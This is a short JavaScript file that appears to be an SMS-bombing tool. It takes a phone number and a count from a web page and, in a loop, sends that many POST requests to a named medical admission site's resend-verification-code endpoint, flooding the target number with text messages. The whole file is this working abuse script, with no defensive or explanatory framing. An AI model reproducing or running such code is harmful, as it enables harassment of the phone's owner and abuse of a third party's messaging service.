const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

function makeRequests() {
  const number = document.getElementById("phoneNumber").value;
  const amount = document.getElementById("requestAmount").value;
  const logElement = document.getElementById("requestsLog");

  logElement.innerHTML = `<p>Request log: ${amount} Msg sending ${number} this number. Please wait for 3 minutes...</p>`;

  const data = new URLSearchParams();
  data.append("phone", number);

  for (let i = 0; i < amount; i++) {
    fetch(url, {
      method: "POST",
      headers: headers,
      body: data,
    })
      .then((response) => response.text())
      .then((responseData) => {
        logElement.innerHTML += `<p>Request ${i + 1}: ${responseData}</p>`;
      })
      .catch((error) => {
        console.error(error);
      });
  }
}
